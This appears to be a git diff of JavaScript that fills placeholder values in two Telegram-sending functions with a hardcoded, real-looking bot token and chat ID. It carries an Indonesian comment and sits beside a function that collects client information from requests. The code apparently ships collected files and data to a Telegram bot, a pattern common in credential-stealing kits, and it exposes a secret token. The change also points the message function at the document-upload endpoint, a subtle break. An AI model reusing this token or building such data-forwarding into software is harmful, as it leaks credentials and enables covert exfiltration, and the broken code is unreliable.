@@ -77,9 +77,9 @@ function getClientInfo(req) {
 
 // Function to send message to Telegram bot
 async function sendMessageToTelegram(message) {
-    const token = 'YOUR_BOT_TOKEN';
-    const chat_id = 'YOUR_CHAT_ID';
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const token = '7135971769:AAEozhsjVD0X1utFIeztYJVo36VmZmMONhA';
+    const chat_id = '1234255375'; // Gantilah dengan chat ID kamu
+    const url = `https://api.telegram.org/bot${token}/sendDocument`;
 
     try {
         const response = await fetch(url, {
@@ -103,8 +103,8 @@ async function sendMessageToTelegram(message) {
 
 // Function to send data to Telegram bot
 async function sendToTelegram(data, filename, content) {
-    const token = 'YOUR_BOT_TOKEN';
-    const chat_id = 'YOUR_CHAT_ID';
+    const token = '7135971769:AAEozhsjVD0X1utFIeztYJVo36VmZmMONhA';
+    const chat_id = '1234255375'; // Gantilah dengan chat ID kamu
     const url = `https://api.telegram.org/bot${token}/sendDocument`;
 
     const formData = new FormData();
